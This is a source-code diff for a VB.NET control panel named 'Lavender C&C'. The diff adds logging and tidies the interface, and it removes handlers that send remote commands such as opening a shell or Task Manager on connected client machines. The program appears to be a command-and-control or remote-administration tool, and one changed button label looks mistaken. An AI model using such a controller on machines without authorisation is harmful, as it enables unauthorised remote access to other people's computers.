             ''Return
         End If
-        If ListenButton.Text = "Start" Then
+        If ListenButton.Text = "&Start" Then
             ''pw = PasswordTextbox.Text
             Try
                 S = New SocketServer
                 S.Start(PortValue.Value)
                 Spinner.Visible = True
-                ListenButton.Text = "Stop"
+                ListenButton.Text = "S&tart"
                 ListenButton.BackColor = Color.Red
                 PasswordTextbox.Enabled = False
                 PortValue.Enabled = False
                 ErrorLabel.Text = Nothing
                 InfoLabel.Text = "Listener started"
+                WriteToLog("Listener started")
                 My.Settings.Port = PortValue.Value
             Catch ex As Exception
-                ErrorLabel.Text = "Socket start error"
+                WriteToLog("Error starting listener: " & ex.Message.ToString)
+                ErrorLabel.Text = "Error starting listener"
                 MsgBox(ex.Message.ToString & Environment.NewLine & ex.StackTrace.ToString, MsgBoxStyle.Critical, "Error")
             End Try
         Else
@@ -914,17 +974,18 @@ Public Class Main
             Next
             S.stops()
             Spinner.Visible = False
-            ListenButton.Text = "Start"
+            ListenButton.Text = "&Start"
             ListenButton.BackColor = Color.Green
             PasswordTextbox.Enabled = True
             PortValue.Enabled = True
+            WriteToLog("Listener stopped")
         End If
 
     End Sub
 
-
+#Region "Tray icon context menu items"
     Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExitToolStripMenuItem.Click
-        End
+        Application.Exit()
     End Sub
 
     Private Sub TrayIcon_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles TrayIcon.MouseDoubleClick
@@ -934,12 +995,13 @@ Public Class Main
         Me.BringToFront()
     End Sub
 
-    Private Sub SdfghToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
+    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
         ShowIcon = True
         ShowInTaskbar = True
         Me.Show()
         Me.BringToFront()
     End Sub
+#End Region
 
     Private Sub Main_Resize(sender As Object, e As EventArgs) Handles MyBase.Resize
         If WindowState = FormWindowState.Minimized Then
@@ -951,8 +1013,6 @@ Public Class Main
             TrayIcon.BalloonTipTitle = "Lavender C&C"
             TrayIcon.BalloonTipText = "Servers online: [x]".Replace("x", L1.Items.Count)
             TrayIcon.ShowBalloonTip(1000)
-        Else
-            ''TrayIcon.Visible = False
         End If
     End Sub
 
@@ -978,6 +1038,7 @@ Public Class Main
         infotimeout = 1
     End Sub
 
+#Region "Controlbox Buttons"
     Private Sub HelpButton_Click(sender As Object, e As EventArgs) Handles AboutButton.Click
         About.Show()
     End Sub
@@ -989,6 +1050,7 @@ Public Class Main
     Private Sub KeysButton_Click(sender As Object, e As EventArgs) Handles KeysButton.Click
         Profiles.Show()
     End Sub
+#End Region
 
     Private Sub ShowPasswordButton_MouseDown(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseDown
         PasswordTextbox.UseSystemPasswordChar = False
@@ -996,12 +1058,6 @@ Public Class Main
 
     Private Sub ShowPasswordButton_MouseUp(sender As Object, e As MouseEventArgs) Handles ShowPasswordButton.MouseUp
         PasswordTextbox.UseSystemPasswordChar = True
-    End Sub
-
-    Private Sub TaskmanButton_Click(sender As Object, e As EventArgs) Handles TaskmanButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.opentaskman)
-        Next
     End Sub
 
     Private Sub CopyToClipboardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToClipboardToolStripMenuItem.Click
@@ -1029,27 +1085,5 @@ Public Class Main
             Clipboard.SetText(zi)
         End If
 
-    End Sub
-
-    Private Sub RetrieveButton_Click(sender As Object, e As EventArgs)
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.getspecs)
-        Next
-    End Sub
-
-    Private Sub Tabs_SelectedIndexChanged(sender As Object, e As EventArgs) Handles Tabs.SelectedIndexChanged
-        Tabs.SelectedTab.Refresh()
-    End Sub
-
-    Private Sub ReconnectButton_Click(sender As Object, e As EventArgs) Handles ReconnectButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.reconnect)
-        Next
-    End Sub
-
-    Private Sub ShellButton_Click(sender As Object, e As EventArgs) Handles ShellButton.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.ToolTipText, n.openshell)
-        Next
     End Sub
 End Class
